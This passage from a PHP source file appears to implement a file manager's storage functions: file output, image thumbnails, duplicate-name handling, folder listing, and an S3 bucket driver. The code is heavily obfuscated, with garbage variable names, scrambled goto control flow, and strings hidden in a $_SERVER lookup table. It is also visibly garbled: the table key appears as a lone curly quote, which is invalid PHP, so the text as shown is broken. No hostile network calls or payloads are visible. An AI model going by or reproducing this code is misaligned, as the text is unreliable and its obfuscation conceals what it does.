F£éÆÚ²éè: } public function fileOutServer($B¿¢¡…Š„, $F¹ïŒÜÒ· = false, $d›òòòİßá = false, $D‰¬µ“ö¢¨ = '') { $this->fileOut($B¿¢¡…Š„, $F¹ïŒÜÒ·, $d›òòòİßá, $D‰¬µ“ö¢¨); } public function fileOutLink($c¿½ã‡™½) { header($_SERVER[“][156] . $c¿½ã‡™½); die; } public function cacheMethod($BĞ«åßĞ›ß, $CöëÉ³Šíô) { goto fĞÙ¨ÌÀ¼Ä; Bø½óÎè: $cçÑ¦İåµ = isset($b²×™í›[$cì¶ä…ø]) ? $b²×™í›[$cì¶ä…ø] : null; if (!is_null($cçÑ¦İåµ)) { return $cçÑ¦İåµ; } $cçÑ¦İåµ = $this->{$BĞ«åßĞ›ß}($CöëÉ³Šíô); goto F®ÄäÉì…Ş; F®ÄäÉì…Ş: $b²×™í›[$cì¶ä…ø] = $cçÑ¦İåµ; return $cçÑ¦İåµ; goto DâÑÜ²òÖÀ; FÊÕ«ŒÔ…í: $cì¶ä…ø = $A¢­‚˜÷åİ[157] . $BĞ«åßĞ›ß . $A¢­‚˜÷åİ[158] . rtrim($eŒ×¯¬º¡’, $A¢­‚˜÷åİ[8]); if (is_null($BĞ«åßĞ›ß)) { $b²×™í› = array(); return; } if (is_null($CöëÉ³Šíô)) { unset($b²×™í›[$cì¶ä…ø]); return; } goto Bø½óÎè; fĞÙ¨ÌÀ¼Ä: $A¢­‚˜÷åİ =& $_SERVER[“]; static $b²×™í› = array(); $eŒ×¯¬º¡’ = $CöëÉ³Šíô ? ltrim($this->getPathOuter($CöëÉ³Šíô), $A¢­‚˜÷åİ[8]) : $CöëÉ³Šíô; goto FÊÕ«ŒÔ…í; DâÑÜ²òÖÀ: } public function fileOutImage($EÕòˆ¸ÚÎ, $bàïáóŠÙ = 250) { goto eÜ¨õ²„; b‹‰×»—ã: if (!($Eâ½¶Š ÜÂ = IO::move($báåéõ¹Ş±, $CÙ²Óó¡§))) { return IO::fileOut($báåéõ¹Ş±); } del_file($báåéõ¹Ş±); IO::fileOut($Eâ½¶Š ÜÂ); goto A‹ºÖƒ¥ ; cåŸ˜î’á: $báåéõ¹Ş± = DATA_THUMB . $e¥ğ”Ò‚Ä’; if (!@file_exists($báåéõ¹Ş±)) { $FĞ¿¬Á = TEMP_FILES; if (!is_dir($FĞ¿¬Á)) { mk_dir($FĞ¿¬Á); } $A¡ö´Ìİ®É = $FĞ¿¬Á . $e‘éª†Ôºù . $a°á¿ßùÙ[91] . $cªêÀÑ¨á¬[$a°á¿ßùÙ[160]]; if (!@file_exists($A¡ö´Ìİ®É)) { $A¡ö´Ìİ®É = $this->download($EÕòˆ¸ÚÎ, $A¡ö´Ìİ®É); } $aå¡Î‚Î™ô = new ImageThumb($A¡ö´Ìİ®É, $a°á¿ßùÙ[167]); $aå¡Î‚Î™ô->prorate($báåéõ¹Ş±, $bàïáóŠÙ, $bàïáóŠÙ * 10); } if (!file_exists($báåéõ¹Ş±) || filesize($báåéõ¹Ş±) < 100) { return @file_exists($A¡ö´Ìİ®É) ? IO::fileOut($A¡ö´Ìİ®É) : $this->fileOut($EÕòˆ¸ÚÎ); } goto b‹‰×»—ã; eÜ¨õ²„: $a°á¿ßùÙ =& $_SERVER[“]; if (substr($EÕòˆ¸ÚÎ, 0, 4) == $a°á¿ßùÙ[144]) { $this->fileOutLink($EÕòˆ¸ÚÎ); } $cªêÀÑ¨á¬ = $this->info($EÕòˆ¸ÚÎ); goto E¸Ã«¶± Ë; aìÚ¤Ò²•ö: if (!($bĞÒôÇß— = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $a°á¿ßùÙ[165]))) { $CÙ²Óó¡§ = IO::mkdir(IO_PATH_SYSTEM_TEMP . $a°á¿ßùÙ[166]); } else { $CÙ²Óó¡§ = KodIO::make($bĞÒôÇß—); } if ($bĞÒôÇß— = IO::fileNameExist($CÙ²Óó¡§, $e¥ğ”Ò‚Ä’)) { $báåéõ¹Ş± = KodIO::make($bĞÒôÇß—); return IO::fileOut($báåéõ¹Ş±); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto cåŸ˜î’á; E¸Ã«¶± Ë: if ($cªêÀÑ¨á¬[$a°á¿ßùÙ[77]] <= 1024 * 50 || !function_exists($a°á¿ßùÙ[159]) || $cªêÀÑ¨á¬[$a°á¿ßùÙ[160]] == $a°á¿ßùÙ[161]) { return $this->fileOut($EÕòˆ¸ÚÎ); } if (isset($cªêÀÑ¨á¬[$a°á¿ßùÙ[162]][$a°á¿ßùÙ[163]])) { $e‘éª†Ôºù = $cªêÀÑ¨á¬[$a°á¿ßùÙ[162]][$a°á¿ßùÙ[163]]; } else { if (isset($cªêÀÑ¨á¬[$a°á¿ßùÙ[162]][$a°á¿ßùÙ[164]])) { $e‘éª†Ôºù = $cªêÀÑ¨á¬[$a°á¿ßùÙ[162]][$a°á¿ßùÙ[164]]; } else { $e‘éª†Ôºù = md5("{$cªêÀÑ¨á¬[$a°á¿ßùÙ[28]]}\137{$cªêÀÑ¨á¬[$a°á¿ßùÙ[75]]}\137{$cªêÀÑ¨á¬[$a°á¿ßùÙ[77]]}"); } } $e¥ğ”Ò‚Ä’ = "{$e‘éª†Ôºù}\x5f{$bàïáóŠÙ}\56\x70\x6e\x67"; goto aìÚ¤Ò²•ö; A‹ºÖƒ¥ : } public function fileOutImageServer($Cõ«„‹µ°‹, $dŞ±ó‚¸ïí = 250) { $this->fileOutImage($Cõ«„‹µ°‹, $dŞ±ó‚¸ïí); } public function fileNameAuto($f›ßŸ¡†…, $Bº¸†£÷ª, $Dò¯²äµ±Ì = REPEAT_RENAME, $bõÌˆòœ†™ = false) { goto fÄó…«»ãê; b¦°ˆî•Â›: $E™™¡™š’ = 1; $F—Œ™£”Şß = substr($Bº¸†£÷ª, 0, strlen($Bº¸†£÷ª) - strlen($bÎ’õÌ¹Ø½)); $E®§Àã½’ = $F—Œ™£”Şß . "\50{$E™™¡™š’}\x29{$bÎ’õÌ¹Ø½}"; goto BÊ¡‡Õ¿›Ì; BÊ¡‡Õ¿›Ì: while ($this->exist(rtrim($f›ßŸ¡†…, $Bôõ¯¯±¤‹[8]) . $Bôõ¯¯±¤‹[8] . $E®§Àã½’)) { $E®§Àã½’ = $F—Œ™£”Şß . "\50{$E™™¡™š’}\51{$bÎ’õÌ¹Ø½}"; $E™™¡™š’++; } return $E®§Àã½’; goto Aâ±®ñØ†ì; fÄó…«»ãê: $Bôõ¯¯±¤‹ =& $_SERVER[“]; $eæÛæº´­ = $f›ßŸ¡†… === $Bôõ¯¯±¤‹[33] ? $Bº¸†£÷ª : rtrim($f›ßŸ¡†…, $Bôõ¯¯±¤‹[8]) . $Bôõ¯¯±¤‹[8] . $Bº¸†£÷ª; if ($Dò¯²äµ±Ì == REPEAT_REPLACE || !$this->exist($eæÛæº´­) || $bõÌˆòœ†™ && $Dò¯²äµ±Ì != REPEAT_RENAME_FOLDER) { return $Bº¸†£÷ª; } goto c¾Áô¢Ö¹©; c¾Áô¢Ö¹©: if ($Dò¯²äµ±Ì == REPEAT_SKIP) { return !1; } $bÎ’õÌ¹Ø½ = $Bôõ¯¯±¤‹[91] . get_path_ext($Bº¸†£÷ª); $bÎ’õÌ¹Ø½ = $bÎ’õÌ¹Ø½ == $Bôõ¯¯±¤‹[91] || $bõÌˆòœ†™ ? $Bôõ¯¯±¤‹[33] : $bÎ’õÌ¹Ø½; goto b¦°ˆî•Â›; Aâ±®ñØ†ì: } public function listAllFiles($b›¤ÜğŞÂ¨, $CøåœÂ™±, $F—®»åÙâ¼ = array()) { goto c»ªÅƒÌ¤¶; FŒÜĞèó™º: $b›¤ÜğŞÂ¨ = trim($b›¤ÜğŞÂ¨, $cÑË¯¸‹[8]); foreach ($CøåœÂ™± as $dÒ Á·½) { $a³Ğ‹‹ä¢é = ltrim(substr($dÒ Á·½, strlen($b›¤ÜğŞÂ¨)), $cÑË¯¸‹[8]); $c¶«š©î›ô = array_merge($c¶«š©î›ô, $this->slicePath($a³Ğ‹‹ä¢é)); } $E®µÍ…Éò = array(); goto Cİ†¾Ú‚¯å; c»ªÅƒÌ¤¶: $cÑË¯¸‹ =& $_SERVER[“]; if (empty($CøåœÂ™±)) { return array(); } $c¶«š©î›ô = array(); goto FŒÜĞèó™º; Cİ†¾Ú‚¯å: foreach (array_unique($c¶«š©î›ô) as $dÒ Á·½) { $b¸Üæ–Ê© = array($cÑË¯¸‹[75] => $this->getPathOuter($cÑË¯¸‹[8] . $b›¤ÜğŞÂ¨ . $cÑË¯¸‹[8] . $dÒ Á·½), $cÑË¯¸‹[76] => 1, $cÑË¯¸‹[77] => 0); if (substr($dÒ Á·½, -1) != $cÑË¯¸‹[8]) { $b¸Üæ–Ê©[$cÑË¯¸‹[76]] = 0; $F÷Ö÷„®ªŒ = $this->getPath($b›¤ÜğŞÂ¨ . $cÑË¯¸‹[8] . $dÒ Á·½); $b¸Üæ–Ê©[$cÑË¯¸‹[77]] = isset($F—®»åÙâ¼[$F÷Ö÷„®ªŒ]) ? $F—®»åÙâ¼[$F÷Ö÷„®ªŒ] : $this->size($F÷Ö÷„®ªŒ); } $E®µÍ…Éò[] = $b¸Üæ–Ê©; } return $E®µÍ…Éò; goto dœÔŒÊË†º; dœÔŒÊË†º: } public function slicePath($FÈ§¹Ö­®Ú) { $Eë‘‡–Ã®Ñ =& $_SERVER[“]; $C›Ê´›¶´Ş = explode($Eë‘‡–Ã®Ñ[8], trim($FÈ§¹Ö­®Ú, $Eë‘‡–Ã®Ñ[8])); $bä¹­ø—‡Ï = 0; do { ++$bä¹­ø—‡Ï; $bÀêìÎ™§[] = implode($Eë‘‡–Ã®Ñ[8], array_slice($C›Ê´›¶´Ş, 0, $bä¹­ø—‡Ï)) . $Eë‘‡–Ã®Ñ[8]; } while ($bä¹­ø—‡Ï < count($C›Ê´›¶´Ş)); $bÀêìÎ™§[count($C›Ê´›¶´Ş) - 1] = $FÈ§¹Ö­®Ú; return $bÀêìÎ™§; } public function getHost() { $bÅÄ†¤ƒˆ‹ =& $_SERVER[“]; $BÊ­œ—Òéó = parse_url(trim($this->domain, $bÅÄ†¤ƒˆ‹[8])); $eÅ÷ßÂÅƒò = isset($BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[168]]) ? $BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[168]] : http_type(); $BÄ‡Òù­ğ = isset($BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[169]]) ? $BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[169]] : $BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[75]]; if (isset($BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[170]])) { $BÄ‡Òù­ğ .= $bÅÄ†¤ƒˆ‹[4] . $BÊ­œ—Òéó[$bÅÄ†¤ƒˆ‹[170]]; } return $eÅ÷ßÂÅƒò . $bÅÄ†¤ƒˆ‹[171] . $BÄ‡Òù­ğ; } public function pathEncode($A­‹‚ßõÃâ) { $b»ªà×É =& $_SERVER[“]; return str_replace($b»ªà×É[172], $b»ªà×É[8], rawurlencode($A­‹‚ßõÃâ)); } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\64"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public function __construct($c»è¡²‡°å) { set_timeout(); require_once SDK_DIR . $_SERVER[“][173]; parent::__construct(); $this->_init($c»è¡²‡°å); } public function _init($Eâ¥¶ŞõĞ) { foreach ($Eâ¥¶ŞõĞ as $f¾•Ÿï„Ğ¬ => $E‰øµÏ½Ô) { if (isset($this->{$f¾•Ÿï„Ğ¬})) { $this->{$f¾•Ÿï„Ğ¬} = $E‰øµÏ½Ô; } } $this->endpoint = $Eâ¥¶ŞõĞ[$_SERVER[“][174]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $this->client->setEndpoint($this->getHost()); } public function signatureVersion($Cš¯ Á¾Ë± = "\166\x34") { $this->signVer = $Cš¯ Á¾Ë±; $this->client->setSignatureVersion($Cš¯ Á¾Ë±); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { return $this->client->getBucketCors($this->bucket); } public function isBucketCors() { goto DíĞã¥ĞÎâ; DíĞã¥ĞÎâ: $Aƒ‚­Ãâ¿º =& $_SERVER[“]; $E†âÃ†¨Ù = $this->getBucketCors(); if (!$E†âÃ†¨Ù || !is_array($E†âÃ†¨Ù)) { return !1; } goto Eƒ‹ãí±; e…“Ğßâêò: $d¡”®ù•¢• = array($Aƒ‚­Ãâ¿º[180], $Aƒ‚­Ãâ¿º[181], $Aƒ‚­Ãâ¿º[182], $Aƒ‚­Ãâ¿º[183], $Aƒ‚­Ãâ¿º[184]); $C«¸¾ØáÎ = array_diff($d¡”®ù•¢•, $cäñìÕôåã); return empty($C«¸¾ØáÎ); goto CáæîëĞ÷í; Eƒ‹ãí±: if ($E†âÃ†¨Ù[$Aƒ‚­Ãâ¿º[175]] != $Aƒ‚­Ãâ¿º[176] || $E†âÃ†¨Ù[$Aƒ‚­Ãâ¿º[177]] != $Aƒ‚­Ãâ¿º[176]) { return !1; } $cäñìÕôåã = array_map($Aƒ‚­Ãâ¿º[178], $E†âÃ†¨Ù[$Aƒ‚­Ãâ¿º[179]]); if (!is_array($cäñìÕôåã)) { $cäñìÕôåã = array(); } goto e…“Ğßâêò; CáæîëĞ÷í: } public function mkfile($b³Æ›‚ŠÎ, $bï¸«ŸÄ¤ò = '', $C¹“ùßÖğ• = REPEAT_RENAME) { $fÌê™óË”¸ = $this->setContent($b³Æ›‚ŠÎ, $bï¸«ŸÄ¤ò); if ($fÌê™óË”¸ !== !1) { return $this->getPathOuter($b³Æ›‚ŠÎ); } return !1; } public function mkdir($AŠ´‘óŠ¦…, $f˜Á¯Ë» = REPEAT_SKIP) { if (empty($AŠ´‘óŠ¦…)) { return !1; } if ($this->_isFolder($AŠ´‘óŠ¦…)) { return $this->getPathOuter($AŠ´‘óŠ¦…); } $CÛŠ¶ÉÉ®™ = $this->setContent($AŠ´‘óŠ¦…, $_SERVER[“][33], !0); if ($CÛŠ¶ÉÉ®™ !== !1) { return $this->getPathOuter($AŠ´‘óŠ¦…); } return !1; } public function copyFile($eè‰Ï˜®Ì, $f¥‡ø„á…, $Aœ¶é°¯¥‚ = array()) { $CÔ·Ô†•Ñ =& $_SERVER[“]; $a‡†ŠÑŸ’ = $this->objectMeta($eè‰Ï˜®Ì); if (!$a‡†ŠÑŸ’) { return !1; } if ($a‡†ŠÑŸ’[$CÔ·Ô†•Ñ[77]] <= 1024 * 1024 * 200) { $A¡ğ‚­‘¹ = $this->client->copyObject($this->bucket, $eè‰Ï˜®Ì, $this->bucket, $f¥‡ø„á…, $CÔ·Ô†•Ñ[185], $Aœ¶é°¯¥‚); } else { $A¡ğ‚­‘¹ = $this->client->multiCopyObject($this->bucket, $eè‰Ï˜®Ì, $this->bucket, $f¥‡ø„á…, $Aœ¶é°¯¥‚); } $A¡ğ‚­‘¹ = $A¡ğ‚­‘¹ ? $this->getPathOuter($f¥‡ø„á…) : !1; return $A¡ğ‚­‘¹; } public function moveFile($dæŒ‹­¥, $cèƒ­¡™Óö) { if ($this->copyFile($dæŒ‹­¥, $cèƒ­¡™Óö)) { $this->delFile($dæŒ‹­¥); return $this->getPathOuter($cèƒ­¡™Óö); } return !1; } public function delFile($BÂ¨Æ­Ü²Ó) { return $this->client->deleteObject($this->bucket, $BÂ¨Æ­Ü²Ó); } public function delFolder($E†êï©±ƒÙ) { goto E òŸ»ä´½; A÷Æø‘Ùö: $FÑ Öº‘ò‚ = $B±¥ÃõŒ = 0; $cÎñæğ‡é = array_chunk(array_keys($dˆ…æ‰è‘ñ), 1000); foreach ($cÎñæğ‡é as $F¨®øµØÖ÷) { $FÑ Öº‘ò‚++; $B±¥ÃõŒ += (int) $this->client->deleteObjects($this->bucket, $F¨®øµØÖ÷); } goto fğ©İ¯ƒä¹; fğ©İ¯ƒä¹: return $FÑ Öº‘ò‚ === $B±¥ÃõŒ ? !0 : !1; goto b§‡õÊ‰áå; E òŸ»ä´½: $A­ÅÔ•Ã =& $_SERVER[“]; $dˆ…æ‰è‘ñ = $this->listObjs($E†êï©±ƒÙ); if (!$dˆ…æ‰è‘ñ) { $E†êï©±ƒÙ = trim($E†êï©±ƒÙ, $A­ÅÔ•Ã[8]); if (!empty($E†êï©±ƒÙ)) { $E†êï©±ƒÙ .= $A­ÅÔ•Ã[8]; } return $this->delFile($E†êï©±ƒÙ); } goto A÷Æø‘Ùö; b§‡õÊ‰áå: } public function rename($EÖƒÍÏÀÁÆ, $fâÅô¿º²¶) { return $this->renameObject($EÖƒÍÏÀÁÆ, $fâÅô¿º²¶); } public function listPath($aÎ¯îğ”«ë, $C›ŒßµïÍØ = false) { $Cğ¬Â•øÒµ =& $_SERVER[“]; $Cªì×†ĞÏ„ = $this->listObjs($aÎ¯îğ”«ë, null, null, $Cğ¬Â•øÒµ[8]); $fÙßÇ­ª¬ = array($Cğ¬Â•øÒµ[74] => array(), $Cğ¬Â•øÒµ[73] => array()); foreach ($Cªì×†ĞÏ„ as $F¿À­ï¤Éí => $EÊª‡ØììŞ) { if ($F¿À­ï¤Éí == $Cğ¬Â•øÒµ[8]) { continue; } if (isset($EÊª‡ØììŞ[$Cğ¬Â•øÒµ[186]])) { $fÙßÇ­ª¬[$Cğ¬Â•øÒµ[74]][] = $this->folderInfo($EÊª‡ØììŞ[$Cğ¬Â•øÒµ[186]], $C›ŒßµïÍØ); } else { if (substr($EÊª‡ØììŞ[$Cğ¬Â•øÒµ[28]], -1) == $Cğ¬Â•øÒµ[8]) { continue; } $fÙßÇ­ª¬[$Cğ¬Â•øÒµ[73]][] = $this->fileInfo($EÊª‡ØììŞ[$Cğ¬Â•øÒµ[28]], $C›ŒßµïÍØ, $EÊª‡ØììŞ); } } return $fÙßÇ­ª¬; } private function fileInfo($B§Ú¤Ö“ïš, $d¾À—´ÔÎÜ = false, $d‹Ş‘…ˆ…Ó = array()) { goto b…ô‰ÅÅó; b…ô‰ÅÅó: $D‰‡ñ½ ÒŒ =& $_SERVER[“]; if ($d¾À—´ÔÎÜ) { return array($D‰‡ñ½ ÒŒ[28] => $this->pathThis($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[75] => $this->getPathOuter($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[29] => $D‰‡ñ½ ÒŒ[167], $D‰‡ñ½ ÒŒ[160] => $this->ext($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[77] => isset($d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[77]]) ? $d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[77]] : 0, $D‰‡ñ½ ÒŒ[187] => 0, $D‰‡ñ½ ÒŒ[107] => 0, $D‰‡ñ½ ÒŒ[188] => !0, $D‰‡ñ½ ÒŒ[189] => !0); } $D¢­¨Ú·Ñ = array($D‰‡ñ½ ÒŒ[28] => $this->pathThis($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[75] => $this->getPathOuter($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[29] => $D‰‡ñ½ ÒŒ[167], $D‰‡ñ½ ÒŒ[187] => 0, $D‰‡ñ½ ÒŒ[107] => 0, $D‰‡ñ½ ÒŒ[77] => 0, $D‰‡ñ½ ÒŒ[160] => $this->ext($B§Ú¤Ö“ïš), $D‰‡ñ½ ÒŒ[188] => !0, $D‰‡ñ½ ÒŒ[189] => !0); goto f³¾×ò¶•Á; E§£´Ï›å: return $D¢­¨Ú·Ñ; goto cäÓÄ «’—; f³¾×ò¶•Á: if (empty($d‹Ş‘…ˆ…Ó)) { $d‹Ş‘…ˆ…Ó = $this->objectMeta($B§Ú¤Ö“ïš); if (!$d‹Ş‘…ˆ…Ó) { return $D¢­¨Ú·Ñ; } } if (isset($d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[190]])) { $D¢­¨Ú·Ñ[$D‰‡ñ½ ÒŒ[107]] = $d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[190]]; } if (isset($d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[77]])) { $D¢­¨Ú·Ñ[$D‰‡ñ½ ÒŒ[77]] = $d‹Ş‘…ˆ…Ó[$D‰‡ñ½ ÒŒ[77]]; } goto E§£´Ï›å; cäÓÄ «’—: } private function folderInfo($B…ç“ ‡è, $DÎùÌÇÏéÀ = false) { goto cµƒâ†ÂŞ; ağÅ®ëí±: if (isset($fˆ¸°©¢ê[$e–ÀÈŸàƒÃ[190]])) { $D…‡ŸÄÈò÷[$e–ÀÈŸàƒÃ[187]] = $fˆ¸°©¢ê[$e–ÀÈŸàƒÃ[190]]; } return $D…‡ŸÄÈò÷; goto aÀ³»º‘ÅŸ; cÁ‘›˜ßõí: if ($B…ç“ ‡è == $e–ÀÈŸàƒÃ[33]) { return $D…‡ŸÄÈò÷; } $B…ç“ ‡è = trim($B…ç“ ‡è, $e–ÀÈŸàƒÃ[8]) . $e–ÀÈŸàƒÃ[8]; $fˆ¸°©¢ê = $this->objectMeta($B…ç“ ‡è); goto ağÅ®ëí±; cµƒâ†ÂŞ: $e–ÀÈŸàƒÃ =& $_SERVER[“]; if ($DÎùÌÇÏéÀ) { return array($e–ÀÈŸàƒÃ[28] => $this->pathThis($B…ç“ ‡è), $e–ÀÈŸàƒÃ[75] => $this->getPathOuter($e–ÀÈŸàƒÃ[8] . $B…ç“ ‡è), $e–ÀÈŸàƒÃ[29] => $e–ÀÈŸàƒÃ[76], $e–ÀÈŸàƒÃ[188] => !0, $e–ÀÈŸàƒÃ[189] => !0); } $D…‡ŸÄÈò÷ = array($e–ÀÈŸàƒÃ[28] => $this->pathThis($B…ç“ ‡è), $e–ÀÈŸàƒÃ[75] => $this->getPathOuter($e–ÀÈŸàƒÃ[8] . $B…ç“ ‡è), $e–ÀÈŸàƒÃ[29] => $e–ÀÈŸàƒÃ[76], $e–ÀÈŸàƒÃ[187] => 0, $e–ÀÈŸàƒÃ[107] => 0, $e–ÀÈŸàƒÃ[188] => !0, $e–ÀÈŸàƒÃ[189] => !0); goto cÁ‘›˜ßõí; aÀ³»º‘ÅŸ: } public function listObjs($eÍŸÏ‘¢», $dãó¸ß˜´ø = null, $CÙÍïÒÇ‡Û = null, $fÒªÆÖ¡½ö = null) { $cõ«ï‘ë¾” =& $_SERVER[“]; $eÍŸÏ‘¢» = trim($eÍŸÏ‘¢», $cõ«ï‘ë¾”[8]); $DÛ“òğÂÁ¼ = empty($eÍŸÏ‘¢») ? $cõ«ï‘ë¾”[33] : $eÍŸÏ‘¢» . $cõ«ï‘ë¾”[8]; return $this->client->getBucket($this->bucket, $DÛ“òğÂÁ¼, $dãó¸ß˜´ø, $CÙÍïÒÇ‡Û, $fÒªÆÖ¡½ö, !0); } public function has($a²ØŸÀŸÑÃ, $c¬•Òù¼Òò = false, $fµ´ë°Ü = true) { goto Fªğ…Ò·±ç; Fªğ…Ò·±ç: $BÉé¹À›ß› =& $_SERVER[“]; $D©™Õ¬× = 0; $Eœ‡•ê¸ĞÀ = 0; goto a”ïƒ¼Í£¥; D“¿ŞÚŠÈ: if ($c¬•Òù¼Òò) { return array($BÉé¹À›ß›[191] => $D©™Õ¬×, $BÉé¹À›ß›[192] => $Eœ‡•ê¸ĞÀ); } return !1; goto FØ¾¡œ“ñŞ; a”ïƒ¼Í£¥: $a•©ö÷›òŸ = $this->listObjs($a²ØŸÀŸÑÃ, null, null, $BÉé¹À›ß›[8]); $a•©ö÷›òŸ = is_array($a•©ö÷›òŸ) ? $a•©ö÷›òŸ : array(); foreach ($a•©ö÷›òŸ as $e§ÅæÙŠêº) { if (isset($e§ÅæÙŠêº[$BÉé¹À›ß›[28]]) && substr($e§ÅæÙŠêº[$BÉé¹À›ß›[28]], -1) != $BÉé¹À›ß›[8]) { if (!$c¬•Òù¼Òò && $fµ´ë°Ü) { return !0; } $D©™Õ¬×++; } else { if (isset($e§ÅæÙŠêº[$BÉé¹À›ß›[186]])) { if (!$c¬•Òù¼Òò && !$fµ´ë°Ü) { return !1; } $Eœ‡•ê¸ĞÀ++; } } } goto D“¿ŞÚŠÈ; FØ¾¡œ“ñŞ: } public function listAll($fæáÜŒÔ–ğ) { $AŠ«É†¿“É =& $_SERVER[“]; $f½Šìµ›¬æ = $this->listObjs($fæáÜŒÔ–ğ); $A—øê“àÍ = $d¶›¼áñ² = array(); foreach ($f½Šìµ›¬æ as $aªà²¿ê‘ => $D‰ˆ—õ¡¦¥) { $A—øê“àÍ[] = $D‰ˆ—õ¡¦¥[$AŠ«É†¿“É[28]]; $d¶›¼áñ²[$aªà²¿ê‘] = $D‰ˆ—õ¡¦¥[$AŠ«É†¿“É[77]]; } return $this->listAllFiles($fæáÜŒÔ–ğ, $A—øê“àÍ, $d¶›¼áñ²); } public function canRead($C‰êğ¼¿“¼) { $cØõßÆ¬åÎ =& $_SERVER[“]; $A¿Ÿ­Š¹•ê = $this->client->getAccessControlPolicy($this->bucket, $C‰êğ¼¿“¼); if (!$A¿Ÿ­Š¹•ê) { return !1; } return in_array($A¿Ÿ­Š¹•ê, array($cØõßÆ¬åÎ[193], $cØõßÆ¬åÎ[194], $cØõßÆ¬åÎ[195])) ? !0 : !1; } public function canWrite($d‚äÊ’²¬) { $Eˆïï÷³Õ  =& $_SERVER[“]; $Bã‰õ•´ö = $this->client->getAccessControlPolicy($this->bucket, $d‚äÊ’²¬); if (!$Bã‰õ•´ö) { return !1; } return in_array($Bã‰õ•´ö, array($Eˆïï÷³Õ [193], $Eˆïï÷³Õ [194])) ? !0 : !1; } public function getContent($FÏ óñÓÖ­) { return $this->client->getObject($this->bucket, $FÏ óñÓÖ­); } public function setContent($bÈ…å’‚»Ñ, $DÃ´Û¡½¦ = '', $C½ìãÇŠ½® = false) { goto dõ¤œ”‚œÀ; D–ÈŠˆ²‚: $D°ìÛ«ÜöÆ = $this->client->putObject($DÃ´Û¡½¦, $this->bucket, $bÈ…å’‚»Ñ, $B™´Èë£ôÍ[185], array(), $DòÈàì…ãó); if (!$D°ìÛ«ÜöÆ) { return !1; } if ($C½ìãÇŠ½®) { return !0; } goto Eˆ‹¬ò˜ÅÇ; dõ¤œ”‚œÀ: $B™´Èë£ôÍ =& $_SERVER[“]; $bÈ…å’‚»Ñ = $C½ìãÇŠ½® ? trim($bÈ…å’‚»Ñ, $B™´Èë£ôÍ[8]) . $B™´Èë£ôÍ[8] : $bÈ…å’‚»Ñ; $DòÈàì…ãó = get_file_mime(get_path_ext($bÈ…å’‚»Ñ)); goto D–ÈŠˆ²‚; Eˆ‹¬ò˜ÅÇ: $this->cacheMethod(null, null); $D°ìÛ«ÜöÆ = $this->copyFile($bÈ…å’‚»Ñ, $bÈ…å’‚»Ñ, array($B™´Èë£ôÍ[196] => $D°ìÛ«ÜöÆ[$B™´Èë£ôÍ[197]])); return $D°ìÛ«ÜöÆ ? !0 : !1; goto e·åóğ¡; e·åóğ¡: } public function fileSubstr($dù¥ƒÀô½Š, $FÚõ–º›•, $dß²À«ƒíİ) { $cåÇ‚òÜèÏ = $FÚõ–º›• + $dß²À«ƒíİ - 1; return $this->client->getObject($this->bucket, $dù¥ƒÀô½Š, array($_SERVER[“][198] => "\x62\x79\x74\x65\163\x3d{$FÚõ–º›•}\55{$cåÇ‚òÜèÏ}")); } public function upload($FÙ©ß°£ˆô, $FÁÁÍšóˆŸ, $E•Œ‹¿ØÜÖ = false, $e©´ĞÌÊö = REPEAT_REPLACE) { $aÎİ‡°‘Û =& $_SERVER[“]; $eÚâíâÕ·â = array($aÎİ‡°‘Û[196] => @md5_file($FÁÁÍšóˆŸ)); $A…®¹î®Ö = array($aÎİ‡°‘Û[199] => get_file_mime(get_path_ext($FÙ©ß°£ˆô))); if (IO::size($FÁÁÍšóˆŸ) <= 1024 * 1024 * 200) { $C˜àêƒ» = $this->client->putObjectFile($FÁÁÍšóˆŸ, $this->bucket, $FÙ©ß°£ˆô, $aÎİ‡°‘Û[185], $eÚâíâÕ·â, $A…®¹î®Ö); return !empty($C˜àêƒ») ? $this->getPathOuter($FÙ©ß°£ˆô) : !1; } $AÊ×®ğ²ä‘ = $this->client->multiUploadObject($FÁÁÍšóˆŸ, $this->bucket, trim($FÙ©ß°£ˆô, $aÎİ‡°‘Û[8]), $eÚâíâÕ·â, $A…®¹î®Ö); return $AÊ×®ğ²ä‘ ? $this->getPathOuter($FÙ©ß°£ˆô) : !1; } public function download($fÇ¡§ ß², $fù¹šÓ½Ñ) { if (!@is_dir($this->pathFather($fù¹šÓ½Ñ)) && !IO::mkdir($this->pathFather($fù¹šÓ½Ñ))) { return !1; } $d¸Á²Ô = $this->client->getObject($this->bucket, $fÇ¡§ ß², array(), $fù¹šÓ½Ñ); return $d¸Á²Ô !== !1 ? $fù¹šÓ½Ñ : !1; } public function link($C°Á†Øç„, $CŒ´®ˆÕÙí = array()) { $FÔ’µÜ‘ˆ“ =& $_SERVER[“]; if ($this->signVer == $FÔ’µÜ‘ˆ“[200]) { return $this->client->getAuthenticatedURL($this->bucket, $C°Á†Øç„, 3600 * 12, $CŒ´®ˆÕÙí); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($C°Á†Øç„, $FÔ’µÜ‘ˆ“[8]), 3600 * 12, $this->region, array(), !0, $CŒ´®ˆÕÙí); } public function fileOut($AÆ…™Á…Ï™, 